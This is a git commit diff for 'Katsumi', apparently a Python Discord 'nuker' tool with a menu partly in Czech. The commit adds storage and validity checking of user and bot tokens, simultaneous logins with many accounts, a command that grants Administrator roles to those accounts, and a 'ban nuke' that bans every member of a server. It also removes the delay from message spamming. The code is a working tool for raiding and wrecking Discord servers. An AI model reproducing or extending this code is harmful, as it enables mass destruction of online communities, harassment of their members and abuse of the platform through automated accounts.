03782bf63f208fd3e483d4aaee5e46a196ce79c4
Asylum <81298611+asxlvm@users.noreply.github.com>
2021-06-07 22:42:53 +0200

    💥 Big update, changelog in description
    - Added ban all command
    - Changed the whole token/user system
    - User accounts work now
    - Multi-token nuking still does more things than it should
    - Maybe some more things but I just don't remember

--- src/main.py
+++ src/main.py
@@ -1,4 +1,4 @@
-import colorama, requests, random, asyncio, json, os, pyfiglet, discord, traceback
+import colorama, requests, random, traceback, asyncio, json, os, pyfiglet, discord, traceback
 from discord.ext import commands
 from colorama import Fore, Back, Style
 from concurrent.futures.thread import ThreadPoolExecutor
@@ -15,25 +15,36 @@ SRESET = Style.RESET_ALL
 base_url = "https://discord.com/api/v9/"
 clients = []
 startCheck = []
-global count0#, count1, count2, count3, count4, count5
 count0 = 0 # spamming
 count1 = 0 # creating channels
 count2 = 0 # removing channels
 count3 = 0 # creating roles
 count4 = 0 # removing roles
 count5 = 0 # server info and perms
+count6 = 0 # banning
 prCount = 0 
 lastPr = ""
 
 with open("icon.jpg", "rb") as f:
   icon = f.read()
 
+#def getTokens():
+#	if envList == True:
+#		tokens = os.getenv("TOKENS")
+#		return json.loads(tokens)
+#	with open("tokens.txt", "r") as f:
+#	  return f.readlines()
+
 def getTokens():
-	if envList == True:
-		tokens = os.getenv("TOKENS")
-		return json.loads(tokens)
-	with open("tokens.txt", "r") as f:
-	  return f.readlines()
+	with open("tokens.json", "r") as f:
+		tkns = json.load(f)
+	return tkns
+
+def setTokens(jsonTkns):
+	global tokens
+	tokens = jsonTkns
+	with open("tokens.json", "w") as f:
+		json.dump(jsonTkns, f)
 
 tokens = getTokens()
 
@@ -79,9 +90,9 @@ def getRoleName():
 def getRandomColor():
   return random.randint(0x00000, 0xFFFFF)
 
-def getTokens():
-	with open("tokens.txt", "r") as f:
-	  return f.readlines()
+# def getTokens():
+# 	with open("tokens.txt", "r") as f:
+# 	  return f.readlines()
 
 def cls():
 	os.system("cls" if os.name == "nt" else "clear")
@@ -94,21 +105,24 @@ async def mainMenu():
 #	cls()
 	print(Fore.GREEN + "\n\n\n" + asciiArt("Katsumi"))
 	print("\n")
-	print(Fore.GREEN + Style.BRIGHT + "\n[1] " + Style.NORMAL + "Start Nuker | " + Style.DIM + "[startne každý token v tokens.txt, ujisti se že fungují]\n" + SRESET)
-	print(Fore.GREEN + Style.BRIGHT + "\n[2] " + Style.NORMAL + "Token Checker | " + Style.DIM + "[checkne každý token v tokens.txt zda funguje]\n" + SRESET)
-	print(Fore.GREEN + Style.BRIGHT + "\n[3] " + Style.NORMAL + "Credits | " + Style.DIM + "[ukáže ty všechny, co na tomto pracovali]\n" + SRESET)
-	print(Fore.GREEN + Style.BRIGHT + "\n[4] " + Style.NORMAL + "How-To | " + Style.DIM + "[tutoriál jak na to]\n" + SRESET)
+	print(Fore.GREEN + Style.BRIGHT + "\n[1] " + Style.NORMAL + "Token Menu | " + Style.DIM + "[gives you the list of your tokens including types, also allows to add tokens]\n" + SRESET)
+	print(Fore.GREEN + Style.BRIGHT + "\n[2] " + Style.NORMAL + "Start Nuker | " + Style.DIM + "[startne každý token v tokens.txt, ujisti se že fungují]\n" + SRESET)
+	print(Fore.GREEN + Style.BRIGHT + "\n[3] " + Style.NORMAL + "Token Checker | " + Style.DIM + "[checkne každý token v tokens.txt zda funguje]\n" + SRESET)
+	print(Fore.GREEN + Style.BRIGHT + "\n[4] " + Style.NORMAL + "Credits | " + Style.DIM + "[ukáže ty všechny, co na tomto pracovali]\n" + SRESET)
+	print(Fore.GREEN + Style.BRIGHT + "\n[5] " + Style.NORMAL + "Server Joiner | " + Style.DIM + "[joine každý user token v tokens.json]\n" + SRESET)
 	try:
-		inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Vyber si | " + Style.DIM + "[podle čísel nalevo od funkcí, si vyber co chceš zapnout]\n" + SRESET))
+		inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Choose | " + Style.DIM + "[every function has a number before it, choose them from the number]\n" + SRESET))
 		#print(inputInteger)
 		if inputInteger == 1:
-			loop.create_task(nukerMenu())
+			loop.create_task(addTokenMenu())
 		elif inputInteger == 2:
-			loop.create_task(tokenCheckerMenu())
+			loop.create_task(nukerMenu())
 		elif inputInteger == 3:
-			loop.create_task(creditsMenu())
+			loop.create_task(tokenCheckerMenu())
 		elif inputInteger == 4:
-			loop.create_task(howToMenu())
+			loop.create_task(creditsMenu())
+		elif inputInteger == 5:
+			loop.create_task(joinerMenu())
 		else:
 			await mainMenu()
 	except:
@@ -137,12 +151,79 @@ async def redirector(typeOfRun):
 	else:
 		return await firstRunMenu()
 
+def pprintTokenInfo():
+  tokens = getTokens()
+  tkns = []
+  if len(tokens) == 0:
+    tkns.append("No tokens.")
+  for token, type in tokens.items():
+    tkns.append(f"{token} | {type['type']}")
+  return tkns
+  
+
+async def addTokenMenu():
+  print(Fore.GREEN + "\n\n\n" + asciiArt("Token Adder"))
+  print("\n")
+  print(Fore.GREEN + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Current Tokens\n" + Style.NORMAL + "\n".join(pprintTokenInfo()) + SRESET)
+  print(Fore.GREEN + Style.BRIGHT + "\n[1] " + Style.NORMAL + "Add a Token | " + Style.DIM + "[need to have internet connection for type checking]\n" + SRESET)
+  print(Fore.GREEN + Style.BRIGHT + "\n[2] " + Style.NORMAL + "Back to Main Menu | " + Style.DIM + "[return to main menu]\n" + SRESET)
+  try:
+  	inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Choose | " + Style.DIM + "[every function has a number before it, choose them from the number]\n" + SRESET))
+  	if inputInteger == 1:
+  		loop.create_task(addToken())
+  	elif inputInteger == 2:
+  		loop.create_task(mainMenu())
+  	else:
+  		await addTokenMenu()
+  except:
+  	await addTokenMenu()
+
+async def addToken():
+	tokenAdding = True
+	while tokenAdding is True:
+	  try:
+	  	inputString = str(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Type your Token | " + Style.DIM + "Just copy&paste your token so that you don't make any mistake.\n" + SRESET))
+	  	tokenType = checkTokenNoVerbose(inputString)
+	  	if tokenType == "Invalid":
+	  		print(Fore.RED + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Invalid Token! | " + Style.DIM + f"{inputString} | Make sure you didn't make any mistake / put a space after it.\n" + SRESET)
+	  	elif tokenType == "Bot":
+	  		tokenss = getTokens()
+	  		tokenss[inputString] = {"type": "Bot"}
+	  		setTokens(tokenss)
+	  		print(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Valid Bot Token! | " + Style.DIM + f"{inputString} | Added to Tokens.\n" + SRESET)
+	  	elif tokenType == "User":
+	  		tokenss = getTokens()
+	  		tokenss[inputString] = {"type": "User"}
+	  		setTokens(tokenss)
+	  		print(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Valid User Token! | " + Style.DIM + f"{inputString} | Added to Tokens.\n" + SRESET)
+	  	inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[?] " + Style.NORMAL + "Wanna add more tokens? | " + Style.DIM + "Type 1 if yes and 2 if no.\n" + SRESET))
+	  	if inputInteger == 1:
+	  		tokenAdding = True
+	  	else:
+	  		tokenAdding = False
+	  except:
+	  	await addToken()
+	await mainMenu()
+  
 async def tokenCheckerMenu():
 	#cls()
 	print(Fore.GREEN + "\n\n\n" + asciiArt("Checker"))
 	print("\n")
 	await checkMany(tokens)
-	
+
+def checkTokenNoVerbose(token):
+	headers = {"Authorization": token}
+	r = requests.get(base_url + "users/@me", headers=headers)
+	if r.status_code != 200:
+		botHeaders = {"Authorization": f"Bot {token}"}
+		rBot = requests.get(base_url + "users/@me", headers=botHeaders)
+		if "message" in rBot.json():
+			return "Invalid"
+		else:
+			return "Bot"
+	else:
+	  return "User"
+
 def checkToken(token):
 	headers = {"Authorization": token}
 	r = requests.get(base_url + "users/@me", headers=headers)
@@ -170,26 +251,47 @@ async def checkMany(tokens):
 	except:
 		return await mainMenu()
 
-
-
 async def nukerMenu():
 	tokenLoop = asyncio.get_event_loop()
 	global controllerID
 	controllerID = int(await async_input(Fore.RED + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Type your Discord ID | " + Style.DIM + f"[the commands will not run if you will not provide it]\n" + SRESET))
-	for i in range(len(tokens)):
-		tokenLoop.create_task(loginToken(loop, controllerID, tokens[i]))
+	for token, type in tokens.items():
+		tokenLoop.create_task(loginToken(loop, controllerID, token, type["type"]))
 	loop.create_task(runningMenu())
 
 async def runningMenu():
 	print(Fore.GREEN + "\n\n\n" + asciiArt("Katsumi"))
 	print(Fore.GREEN + Style.BRIGHT + "\n[1] " + Style.NORMAL + "Server Joiner | " + Style.DIM +"[joins a server for every " + Style.NORMAL + "user " + Style.DIM + "token in your tokens]" + SRESET)
 	print(Fore.GREEN + Style.BRIGHT + "\n[2] " + Style.NORMAL + "Back to Main Menu | " + Style.DIM +"[kills every running user] " + Style.DIM + SRESET)
-	
-	
-async def loginToken(asyncloop, controllerID, token):
-	client = commands.Bot(command_prefix="!", fetch_offline_members=False)
+	try:
+		inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Choose | " + Style.DIM + "[every function has a number before it, choose them from the number]\n" + SRESET))
+		#print(inputInteger)
+		if inputInteger == 1:
+			loop.create_task(joinerMenu())
+		elif inputInteger == 2:
+			loop.create_task(closeClients())
+		else:
+			await runningMenu()
+	except:
+		await runningMenu()
+
+
+def getClientsID():
+	ids = []
+	for clientI in clients:
+		ids.append(clientI.user.id)
+	return ids
+
+async def loginToken(asyncloop, controllerID, token, tokenType):
+	global clients
+	intents = discord.Intents().all()
+	client = commands.Bot(command_prefix="!", fetch_offline_members=False, intents=intents)
 	client.add_cog(Nuker(client, controllerID))
-	asyncloop.create_task(client.start(token))
+	if tokenType == "Bot":
+		asyncloop.create_task(client.start(token, bot=True))
+	elif tokenType == "User":
+		asyncloop.create_task(client.start(token, bot=False))
+	clients.append(client)
 	return
 
 def safePrint(msg):
@@ -213,6 +315,47 @@ class Nuker(commands.Cog):
 	async def test(self, ctx):
 		await ctx.send("test indeed")
 	
+	@commands.command(aliases=["gperms", "giveperms"])
+	async def gp(self, ctx, *, roleName = None):
+	  if roleName == None:
+	    roleName = getRoleName()
+	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Perms Transfer is starting! | " + Style.DIM + f"Going to try to give Administrator perms to your {len(clients)} nuker accounts\n" + SRESET)
+	  if ctx.author.id != self.controllerID:
+	    return
+	  global count5
+	  if count5 != 0:
+	    safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Perms Transfer already going on! | " + Style.DIM + f"Wait until the Perms Transfer ends\n" + SRESET)
+	    return
+	  try:
+	    highestRolePos = ctx.guild.get_member(self.client.user.id).top_role.position
+	    if highestRolePos <= 0:
+	      rolePos = highestRolePos
+	    else:
+	      rolePos = highestRolePos - 1
+	    role = await ctx.guild.create_role(name=roleName, color=getRandomColor(), permissions=discord.Permissions(administrator=True))
+	    await role.edit(position=rolePos)
+	  except:
+	    return
+	  try:
+	    controllerMmbr = ctx.guild.get_member(self.controllerID)
+	    await controllerMmbr.add_roles(role)
+	  except:
+	    pass
+	  for clientI in clients:
+	    try:
+	      id_ = clientI.user.id
+	      mmbr = ctx.guild.get_member(id_)
+	      await mmbr.add_roles(role)
+	      count5 += 1
+	    except:
+	      traceback.print_exc()
+	      pass
+	  await asyncio.sleep(3)
+	  if count5 != 0:
+	    safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + f"Perms Transfer is done from account {self.client.user.name}#{self.client.user.discriminator}! | " + Style.DIM + f"Gave Administrator perms to {count5} out of {len(clients)} nuker accounts of yours on {ctx.guild.name}\n" + SRESET)
+	  count5 = 0
+	  
+	
 	@commands.command(aliases=["cspam", "channelspam"])
 	async def cs(self, ctx, msgCount: int = None):
 		if msgCount == None:
@@ -228,7 +371,7 @@ class Nuker(commands.Cog):
 		for i in range(msgCount):
 			await ctx.send(getMessage)
 			count0 += 1
-			await asyncio.sleep(0.5)
+			#await asyncio.sleep(0.5)
 			if msgCount <= count0:
 				await asyncio.sleep(3)
 				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is done! | " + Style.DIM + f"Spammed {count0} messages in #{ctx.channel.name}\n" + SRESET)
@@ -299,16 +442,48 @@ class Nuker(commands.Cog):
 	      count4 += 1
 	    except Exception:
 	      continue
-	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is starting! | " + Style.DIM + f"Deleted every original role and going to create {roleCount} Katsumi roles\n" + SRESET)
+	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is starting! | " + Style.DIM + f"Deleted every original role and going to create {roleCount} Katsumi roles!\n" + SRESET)
 	  for i in range(roleCount):
-	    await ctx.guild.create_role(name=getRoleName(), color=getRandomColor())
-	    count3 += 1
-	    if count3 == roleCount:
-	      await asyncio.sleep(3)
-	      safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is done! | " + Style.DIM + f"Deleted {count4} original role(s) and created {count3} Katsumi role\n" + SRESET)
-	      count3 = 0
-	      count4 = 0
-	      break
+	    try:
+	      await ctx.guild.create_role(name=getRoleName(), color=getRandomColor())
+	      count3 += 1
+	      if count3 == roleCount:
+	        await asyncio.sleep(3)
+	        safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is done! | " + Style.DIM + f"Deleted {count4} original role(s) and created {count3} Katsumi roles!\n" + SRESET)
+	        count3 = 0
+	        count4 = 0
+	        break
+	    except:
+	    	await asyncio.sleep(3)
+	    	count3 = 0 
+	    	count4 = 0 
+	    	return safePrint(Fore.RED + Style.BRIGHT + "\n[!] " + Style.NORMAL + f"Role Nuke has failed for {self.client.user.name}#{self.client.user.discriminator}! | " + Style.DIM + f"{self.client.user.name} doesn't have permissions to create roles!\n" + SRESET)
+
+	@commands.command(aliases=["bnuke", "bannuke"])
+	async def bn(self, ctx):
+	  if ctx.author.id != self.controllerID:
+	    return
+	  global count6
+	  if count6 != 0:
+	    safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Ban Nuke is already going on! | " + Style.DIM + f"Wait until the ban nuke ends\n" + SRESET)
+	    return
+	  userCount = 0
+	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Ban Nuke is starting! | " + Style.DIM + f"Going to try to ban every member of {ctx.guild.name}!\n" + SRESET)
+	  for user in ctx.guild.members:
+	    try:
+	    	if user.id in getClientsID() or user.id in [self.controllerID]:
+	    		userCount += 1
+	    		continue
+	    	await user.ban(reason=getMessage)
+	    	count6 += 1
+	    	userCount += 1
+	    except Exception:
+	      continue
+	  await asyncio.sleep(3)
+	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Ban Nuke is done! | " + Style.DIM + f"Banned {count6} members out of {userCount} members!\n" + SRESET)
+	  count6 = 0
+	  userCount = 0
+	  
 
 if __name__ == "__main__":
 	if startCheck == []:
